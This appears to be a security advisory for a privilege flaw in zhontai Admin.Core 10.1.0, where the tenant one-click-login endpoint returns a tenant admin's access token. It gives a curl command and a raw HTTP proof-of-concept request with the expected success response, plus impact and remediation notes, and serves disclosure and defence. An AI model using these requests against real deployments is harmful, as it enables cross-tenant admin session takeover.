# Admin.Core — Tenant one-click login issues target tenant admin tokens (AC-VULN-011)

| Field | Value |
|-------|-------|
| Vendor | zhontai |
| Product | Admin.Core (中台Admin) |
| Version | 10.1.0 |
| Type | Improper Authorization |
| CWE | CWE-269 |
| Authentication | Authenticated user with tenant one-click-login permission |
| Severity | High |

## Summary

`TenantService.OneClickLoginAsync(tenantId)` disables filters and returns TokenInfo for the tenant owner/admin.

## Root cause

Impersonation by tenantId without step-up authentication.

## Exploit / reproduction

```bash
curl -s -X POST 'http://127.0.0.1:18010/api/admin/tenant/one-click-login?tenantId=TENANT_ID' \
  -H "Authorization: Bearer $TOKEN"
```


## PoC (Yakit)

```http
POST /api/admin/tenant/one-click-login?tenantId=161223412138053 HTTP/1.1
Host: 127.0.0.1:18010
Authorization: Bearer ADMIN_TOKEN
Connection: close
```

Expected: HTTP 200; success=true; data.accessToken present

## Screenshots

Dynamic verify: tenant one-click-login returns accessToken.

## Impact

Cross-tenant admin session takeover for holders of the API permission.

## Remediation

Restrict to PlatformAdmin; audit; short-lived impersonation claims.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/admincore_poc_verify.py`, `admincore_jwt_forge.py`
- Upstream: https://github.com/zhontai/Admin.Core
